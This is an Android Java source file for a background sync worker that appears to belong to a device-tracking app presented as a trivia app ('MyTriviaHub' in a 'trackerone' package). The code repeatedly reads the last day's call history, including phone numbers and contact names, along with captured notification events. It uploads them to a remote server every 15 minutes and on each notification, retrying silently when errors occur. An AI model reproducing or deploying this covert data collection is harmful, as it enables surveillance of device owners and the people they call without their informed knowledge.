package com.trackerone.mobile;

import android.Manifest;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import androidx.annotation.NonNull;
import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.Data;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

/**
 * Uploads only device-authorized call history and notification summaries. The
 * system schedules it with a network constraint, a 15-minute periodic floor,
 * and exponential retry; notification events enqueue a coalesced one-time run.
 */
public final class MyTriviaHubBackgroundSyncWorker extends Worker {
  static final String PREFS = "mytriviahub_background_sync";
  private static final String API_BASE_URL = "api_base_url";
  private static final String AUTH_TOKEN = "auth_token";
  private static final String PERIODIC_WORK = "mytriviahub_periodic_native_sync";
  private static final String NOTIFICATION_WORK = "mytriviahub_notification_native_sync";
  private static final String NOTIFICATIONS_ONLY = "notifications_only";
  private static final int MAX_ROWS = 500;

  public MyTriviaHubBackgroundSyncWorker(@NonNull Context context, @NonNull WorkerParameters parameters) {
    super(context, parameters);
  }

  static void configure(Context context, String apiBaseUrl, String authToken) {
    if (apiBaseUrl == null || !apiBaseUrl.startsWith("https://") || authToken == null || authToken.trim().isEmpty()) {
      throw new IllegalArgumentException("A secure API URL and device token are required");
    }
    context.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
      .putString(API_BASE_URL, apiBaseUrl.replaceAll("/+$", ""))
      .putString(AUTH_TOKEN, authToken)
      .apply();
    schedulePeriodic(context);
  }

  private static Constraints networkConstraint() {
    return new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
  }

  static void schedulePeriodic(Context context) {
    PeriodicWorkRequest request = new PeriodicWorkRequest.Builder(MyTriviaHubBackgroundSyncWorker.class, 15, TimeUnit.MINUTES)
      .setConstraints(networkConstraint())
      .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
      .build();
    WorkManager.getInstance(context).enqueueUniquePeriodicWork(PERIODIC_WORK, ExistingPeriodicWorkPolicy.UPDATE, request);
  }

  static void enqueueNotificationSync(Context context) {
    SharedPreferences prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
    if (prefs.getString(API_BASE_URL, "").isEmpty() || prefs.getString(AUTH_TOKEN, "").isEmpty()) return;
    Data input = new Data.Builder().putBoolean(NOTIFICATIONS_ONLY, true).build();
    OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(MyTriviaHubBackgroundSyncWorker.class)
      .setInputData(input)
      .setConstraints(networkConstraint())
      .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
      .build();
    WorkManager.getInstance(context).enqueueUniqueWork(NOTIFICATION_WORK, ExistingWorkPolicy.KEEP, request);
  }

  @NonNull
  @Override
  public Result doWork() {
    try {
      SharedPreferences prefs = getApplicationContext().getSharedPreferences(PREFS, Context.MODE_PRIVATE);
      String apiBaseUrl = prefs.getString(API_BASE_URL, "");
      String authToken = prefs.getString(AUTH_TOKEN, "");
      if (apiBaseUrl.isEmpty() || authToken.isEmpty()) return Result.failure();

      boolean notificationsOnly = getInputData().getBoolean(NOTIFICATIONS_ONLY, false);
      JSONObject payload = new JSONObject();
      payload.put("callLogs", notificationsOnly ? new JSONArray() : readRecentCallLogs());
      payload.put("contacts", new JSONArray());
      payload.put("usage", new JSONArray());
      payload.put("notifications", readNotificationEvents());

      int status = postPayload(apiBaseUrl + "/api/device/native-data", authToken, payload);
      if (status >= 200 && status < 300) return Result.success();
      return status == 401 || status == 403 || (status >= 400 && status < 500) ? Result.failure() : Result.retry();
    } catch (Exception ignored) {
      return Result.retry();
    }
  }

  private JSONArray readRecentCallLogs() {
    JSONArray rows = new JSONArray();
    if (getApplicationContext().checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return rows;
    long since = System.currentTimeMillis() - 24L * 60L * 60L * 1000L;
    String[] projection = { CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME };
    try (Cursor cursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, CallLog.Calls.DATE + " >= ?", new String[] { String.valueOf(since) }, CallLog.Calls.DATE + " DESC")) {
      while (cursor != null && cursor.moveToNext() && rows.length() < MAX_ROWS) {
        JSONObject row = new JSONObject();
        row.put("number", cursor.getString(0));
        row.put("type", cursor.getInt(1));
        row.put("date", cursor.getLong(2));
        row.put("durationSeconds", cursor.getInt(3));
        row.put("cachedName", cursor.getString(4));
        rows.put(row);
      }
    } catch (Exception ignored) {
      // Missing or revoked permission yields an empty array; other channels can still synchronize.
    }
    return rows;
  }

  private JSONArray readNotificationEvents() {
    JSONArray accepted = new JSONArray();
    try {
      SharedPreferences prefs = getApplicationContext().getSharedPreferences(MyTriviaHubNotificationListenerService.PREFS, Context.MODE_PRIVATE);
      JSONArray source = new JSONArray(prefs.getString(MyTriviaHubNotificationListenerService.EVENTS, "[]"));
      for (int index = 0; index < source.length() && accepted.length() < MAX_ROWS; index++) {
        JSONObject event = source.optJSONObject(index);
        if (event != null && !event.optString("key").isEmpty() && !event.optString("packageName").isEmpty()) accepted.put(event);
      }
    } catch (Exception ignored) {
      // Notification access is optional and listener storage can be empty.
    }
    return accepted;
  }

  private int postPayload(String endpoint, String authToken, JSONObject payload) throws Exception {
    HttpURLConnection connection = (HttpURLConnection) new URL(endpoint).openConnection();
    try {
      connection.setRequestMethod("POST");
      connection.setConnectTimeout(15_000);
      connection.setReadTimeout(20_000);
      connection.setDoOutput(true);
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("x-device-token", authToken);
      byte[] bytes = payload.toString().getBytes(StandardCharsets.UTF_8);
      try (OutputStream stream = connection.getOutputStream()) { stream.write(bytes); }
      return connection.getResponseCode();
    } finally {
      connection.disconnect();
    }
  }
}
